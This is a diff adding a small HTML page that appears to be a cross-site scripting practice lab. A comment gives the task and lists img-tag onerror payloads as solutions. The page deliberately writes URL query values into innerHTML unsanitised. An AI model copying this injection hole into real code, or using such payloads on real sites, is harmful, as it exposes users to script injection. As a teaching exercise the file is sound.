@@ -1,0 +1,38 @@
+<!-- TASK: is to execute an alert(-100) on the target machine -->
+
+<!-- Solution(s): 
+
+     passing any of these as data input
+     
+     <img src="image.gif" onerror="alert(1)">
+     <img src="" onerror="alert(1)">
+     <img src onerror="alert(1)">
+
+     -->
+
+     <!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Basic XSS</title>
+  </head>
+  <body>
+    <h1>Sample XSS exploit</h1>
+    <form action="./index.html">
+      <label for="formValue">Enter Name:</label><br>
+      <input type="text" name="formValue"><br>
+      <input type="submit" value="Submit">
+    </form>
+
+    <div id="results"></div>
+
+    <script>
+      const resultsTag = document.getElementById('results');
+
+      new URLSearchParams(window.location.search).forEach((value) => {
+          resultsTag.innerHTML += value;
+      })
+    </script>
+
+    
+  </body>
+</html>
